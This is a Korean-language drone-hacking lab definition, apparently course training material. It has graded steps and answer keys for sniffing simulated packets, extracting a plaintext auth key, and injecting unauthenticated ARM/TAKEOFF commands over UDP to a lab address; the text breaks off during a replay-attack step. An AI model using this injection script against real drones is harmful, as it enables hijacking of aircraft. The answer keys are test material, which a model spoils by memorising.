lab_id: autonomous-systems-ai-week03
title: '[Non-AI] 드론 해킹'
version: ai
course: autonomous-systems-ai
week: 3
description: 드론 통신 스니핑, 명령 인젝션, 하이재킹 기법을 실습합니다
difficulty: medium
duration_minutes: 120
objectives:
- 드론 통신을 스니핑한다
- 명령 인젝션 공격을 수행한다
- 드론 하이재킹 시나리오를 시뮬레이션한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: Python으로 가상 드론 통신 패킷을 스니핑하는 시뮬레이터를 작성하시오. 6개 이상의 캡처된 패킷을 출력하라.
  hint: 캡처된 패킷 리스트를 만들고 분석하세요.
  category: recon
  points: 10
  answer: '🤖 프롬프트: Python으로 가상 드론 통신 패킷을 스니핑하는 시뮬레이터를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): python3 -c "import json;pkts=[{''src'':''10.20.30.201'',''data'':{''action'':''AUTH'',''key'':''DRONE_SECRET''}},{''src'':''10.20.30.201'',''data'':{''action'':''ARM''}},{''src'':''10.20.30.201'',''data'':{''action'':''TAKEOFF'',''alt'':50}},{''src'':''10.20.30.200'',''data'':{''status'':''FLYING''}},{''src'':''10.20.30.201'',''data'':{''action'':''GOTO'',''lat'':37.57}},{''src'':''10.20.30.201'',''data'':{''action'':''LAND''}}];print(''===
    Sniffed Packets ==='');[print(f''  [{i}] {p[\"src\"]} -> {json.dumps(p[\"data\"])}'') for i,p in enumerate(pkts)]"'
  answer_detail: 통신 스니핑으로 인증키와 명령 구조를 파악합니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: 드론 통신 패킷 스니핑 시뮬레이션 — Python 으로 캡처된 6+ 패킷 출력, 평문 트래픽의 위험성 관찰
      success_criteria:
      - python 으로 가상 패킷 6개 이상 출력
      - 각 패킷의 필드(source/dest/command/payload) 포함
      - 평문 전송 위험 언급
      acceptable_methods:
      - python dict + print
      - scapy sniff 모방
      - tcpdump -X 포맷 출력
      - pcap 파일 파싱
      negative_signs:
      - 패킷 3개 이하
      - 필드 누락
      - 위험 해석 없음
  target_vm: attacker
  script: python3 -c "import json;pkts=[{'src':'10.20.30.201','data':{'action':'AUTH','key':'DRONE_SECRET'}},{'src':'10.20.30.201','data':{'action':'ARM'}},{'src':'10.20.30.201','data':{'action':'TAKEOFF','alt':50}},{'src':'10.20.30.200','data':{'status':'FLYING'}},{'src':'10.20.30.201','data':{'action':'GOTO','lat':37.57}},{'src':'10.20.30.201','data':{'action':'LAND'}}];print('===
    Sniffed Packets ===');[print(f'  [{i}] {p[\"src\"]} -> {json.dumps(p[\"data\"])}') for i,p in enumerate(pkts)]"
  risk_level: low
  bastion_prompt: Python으로 가상 드론 통신 패킷을 스니핑하는 시뮬레이터를 작성하시오. 6개 이상의 캡처된 패킷을 출력하라.
- order: 2
  instruction: 스니핑된 패킷에서 평문 인증키를 추출하시오. 키가 평문으로 전송되는 위험성을 출력하라.
  hint: 캡처된 패킷 중 AUTH 액션을 가진 패킷에서 key 필드를 찾으세요.
  category: attack
  points: 12
  answer: '🤖 프롬프트: 스니핑된 패킷에서 평문 인증키를 추출해줘

    📎 참고 (CLI): python3 -c "pkts=[{''action'':''AUTH'',''key'':''DRONE_SECRET_2026''},{''action'':''ARM''},{''action'':''TAKEOFF''}];found=[p[''key'']
    for p in pkts if ''key'' in p];print(f''[CRITICAL] Auth key found in plaintext: {found[0]}'') if found
    else print(''No key found'')"'
  answer_detail: 평문 인증키 전송은 가장 심각한 드론 통신 취약점입니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: 스니핑 결과에서 평문 인증키 추출 — 평문 키 전송 위험 실증
      success_criteria:
      - 캡처 패킷 중 auth_key/token 필드 추출
      - 평문 노출 위험 경고 출력
      - TLS/암호화 권고 언급
      acceptable_methods:
      - grep 또는 python re 로 key 필드 추출
      - json parse
      - hexdump 분석
      - wireshark follow TCP stream
      negative_signs:
      - 키 추출 없음
      - 위험 경고 누락
      - 권고 없음
  target_vm: attacker
  script: 'python3 -c "pkts=[{''action'':''AUTH'',''key'':''DRONE_SECRET_2026''},{''action'':''ARM''},{''action'':''TAKEOFF''}];found=[p[''key'']
    for p in pkts if ''key'' in p];print(f''[CRITICAL] Auth key found in plaintext: {found[0]}'') if found
    else print(''No key found'')"'
  risk_level: low
  bastion_prompt: 스니핑된 패킷에서 평문 인증키를 추출해줘
- order: 3
  instruction: Python으로 인증 없이 가상 드론에 ARM/TAKEOFF 명령을 인젝션하는 스크립트를 작성하시오.
  hint: UDP 소켓으로 직접 명령 JSON을 전송하세요.
  category: attack
  points: 12
  answer: '🤖 프롬프트: Python으로 인증 없이 가상 드론에 ARM/TAKEOFF 명령을 인젝션하는 스크립트를 구현 방법을 설명하고 예시 코드를 보여줘

    📎 참고 (CLI): python3 -c "import socket,json;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(2);cmds=[{''action'':''ARM''},{''action'':''TAKEOFF'',''altitude'':100}];print(''===
    Command Injection ==='');[print(f''  Injecting: {json.dumps(c)}'') for c in cmds];[s.sendto(json.dumps(c).encode(),(''10.20.30.200'',9999))
    for c in cmds];print(''  [!] Commands sent without authentication'');s.close()"'
  answer_detail: 인증 없는 명령 전송은 드론 탈취의 핵심 공격 벡터입니다.
  verify:
    type: output_contains
    expect: null
    field: stdout
    semantic:
      intent: 인증 없는 가상 드론에 ARM/TAKEOFF 명령 인젝션 — 인증 부재 악용 시뮬레이션
      success_criteria:
      - python 으로 UDP 로 ARM/TAKEOFF 패킷 전송
      - 드론 응답(ACCEPTED) 확인
      - 인증 없는 설계의 치명적 위험 설명
      acceptable_methods:
      - python socket.sendto 로 MAVLink 명령
      - scapy raw UDP
      - nc -u <host> 9999
      - mavproxy 사용
      negative_signs:
      - 인증 없는 개념만 설명
      - 명령 전송 없음
      - 응답 확인 없음
  target_vm: attacker
  script: 'python3 -c "import socket,json;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.settimeout(2);cmds=[{''action'':''ARM''},{''action'':''TAKEOFF'',''altitude'':100}];print(''===
    Command Injection ==='');[print(f''  Injecting: {json.dumps(c)}'') for c in cmds];[s.sendto(json.dumps(c).encode(),(''10.20.30.200'',9999))
    for c in cmds];print(''  [!] Commands sent without authentication'');s.close()"'
  risk_level: low
  bastion_prompt: Python으로 인증 없이 가상 드론에 ARM/TAKEOFF 명령을 인젝션하는 스크립트를 작성하시오.
- order: 4
  instruction: MAVLink 리플레이 공격을 시뮬레이션하시오. 캡처된 TAKEOFF 명령을 재전송하는 코드를 작성하라.
  hint: 이전에 캡처한 명령을 동일하게 재전송하세요.
  category: attack
  points: 12
  answer: '🤖 프롬프트: MAVLink 리플레이 공격을 시뮬레이션하시오 구현 방법과 예시를 설명해줘

    📎 참고 (CLI): python3 -c "import json;captured={''action'':''TAKEOFF'',''altitude'':50};print(''===
    Replay Attack ==='');print(f''  Captured: {json.dumps(captured)}'');print(f''  Replaying captured
    TAKEOFF command...'');print(f''  [!] No sequence number validation = replay possible'')"'
  answer_detail: 리플레이 공격은 시퀀스 번호 미검증 시 가능합니다.
  verify:
